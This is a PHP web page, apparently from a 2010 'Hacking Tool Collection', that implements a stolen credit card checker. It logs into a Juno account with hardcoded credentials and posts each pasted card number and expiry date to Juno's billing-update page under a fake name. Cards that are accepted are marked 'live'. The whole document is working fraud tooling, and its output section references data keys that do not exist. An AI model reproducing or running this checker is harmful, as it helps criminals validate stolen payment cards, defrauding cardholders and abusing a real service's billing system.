<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
<title>Check CCN via Juno</title>
<meta name="description" content="Hacking Tool Collection" />
<meta name="generator" content="Copyright (c) 2010 by Jin9x" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link type="text/css" rel="stylesheet" href="images/style.css" />
</head>
<body dir="ltr">
<div class="c15" align="center">
<div class="main c14"><br/>
<?php
require_once('curl.class.php');
$user = 'conchym';
$pass = '123';
$listlive = array();
if(isset($_POST['list']) && isset($_POST['phancach']) && isset($_POST['monthpos']) && isset($_POST['yearpos']) && isset($_POST['numpos'])){
	$list = $_POST['list'];
	$phancach = $_POST['phancach'];
	$ccnum = $_POST['numpos'];
	$month = $_POST['monthpos'];
	$year = $_POST['yearpos'];
}else{
	$phancach = '|';$ccnum = '1';$month = '2';$year = '3';$list='';
}
?>
<h1>Check CCN v1.0 </h1>
<form name="form" method="post" action="">
	<textarea name="list" cols="70" rows="10"><?=$list;?></textarea>
	 <br />
	  Phân cách: <input type="text" name="phancach" size=6 value="<?=$phancach;?>"> 
	  | CC Num: <input type="text" name="numpos" size=2 value="<?=$ccnum;?>"> 
	  | Month: <input type="text" name="monthpos" size=2 value="<?=$month;?>"> 
	  | Year: <input type="text" name="yearpos" size=2 value="<?=$year;?>">
		 <input type="submit" name="submit" value="Check Now" />
	  <br/><br/>
</form>
<div class="crackhash" style="padding:0px 10px 5px 70px;">
<div class="result" style="width:260px;color: #FFF;">CC Num</div>
<div class="result" style="width:80px;color: #FFF;">Month</div>
<div class="result" style="width:80px;color: #FFF;">Year</div>
<div class="result" style="width:100px;color: #FFF;">Status</div>
</div>
<?
if(isset($_POST['list']) && isset($_POST['phancach']) && isset($_POST['monthpos']) && isset($_POST['yearpos']) && isset($_POST['numpos'])){
	$cclist = explode("\n", $list);
	$max = count($cclist);
	$curl = new curl;
	$curl->cookiefile(createtxt());
	$url = 'https://account.juno.com/s/logon';
	$login = array(
		'GOTO_URL'	=>	'',
		'FAIL_URL'	=>	'',
		'MemberID'	=>	$user,
		'Password'	=>	$pass,
		'x'	=>	21,
		'y'	=>	11,
	);
	$curl->post($url, $login);
	$url = 'https://account.juno.com/s/account';
	for($i=0;$i<$max;$i++){
		$a = explode($phancach, $cclist[$i]);
		$num = $a[$ccnum-1];
		$mon = (strlen($a[$month-1])==1)?('0'.$a[$month-1]):$a[$month-1];
		$yea = '20'.substr($a[$year-1],-3);
		$data = array(
			'CREDIT_CARD_NUMBER'	=>	$num,
			's'	=>	'UPDATE',	'r'	=>	'update-cc-info',
			'CARD_LAST_FOUR_DIGITS'	=>	'1234',
			'CARD_TYPE'	=>	'Visa',
			'PAY_STATUS'	=>	'',
			'Billing_CardExpiration'	=>	'',
			'EXPIRY_MONTH'	=>	$mon,
			'EXPIRY_YEAR'	=>	$yea,
			'BILLING_NAME'	=>	'Daniel Epstein',
			'submit'	=>	'Submit',
		);
		$post = $curl->post($url, $data);
		if(strstr($post, 'Your credit card information has been successfully processed')){
			$status = 'live';
			$listlive[] = $cclist[$i];
		}
		else
			$status = '<font color=red>die</font>';
		echo '<div class="crackhash" style="padding:0px 10px 0px 70px;">
		<div class="result" style="width:260px;">'.$num.'</div>
		<div class="result" style="width:80px;">'.$mon.'</div>
		<div class="result" style="width:80px;">'.$yea.'</div>
		<div class="result" style="width:100px;">'.$status.'</div>
		</div>';
	}
	$curl->close();
}if ($listlive) {
	echo '<hr/>';
	echo "Live list:<br />";
	$c = count($listlive['email']);
	echo '<textarea name="accountlist" cols="80" rows="10">';
	for ($i=0;$i<$c;$i++) {
		echo ($i+1)." | ".$listlive['email'][$i]." | ".$listlive['password'][$i]." | ".strip_tags($listlive['status'][$i])." | ".url."\n";
	}
	echo '</textarea>';
}
?>
<br/>
</div>
<div class="c14 c11">
	<div class="c12"> <span class="c11">Copyright &#169; 2010 by <a href="ymsgr:sendIM?jin9x">Jin9x</a></span>
  </div>
  <div class="c13">
   <a target="_blank" href="http://jigsaw.w3.org/css-validator/check/referer"><img src="http://jigsaw.w3.org/css-validator/images/vcss-blue" alt="This document validates as CSS level 3!" width="20%" /></a> 
    <a target="_blank" href="http://validator.w3.org/check?uri=referer"><img src="http://validator.w3.org/images/valid_icons/valid-xhtml10-blue" alt="This document was successfully checked as XHTML 1.0 Transitional!" width="20%" /></a>
</div>
</div>

  </div>
</body></html>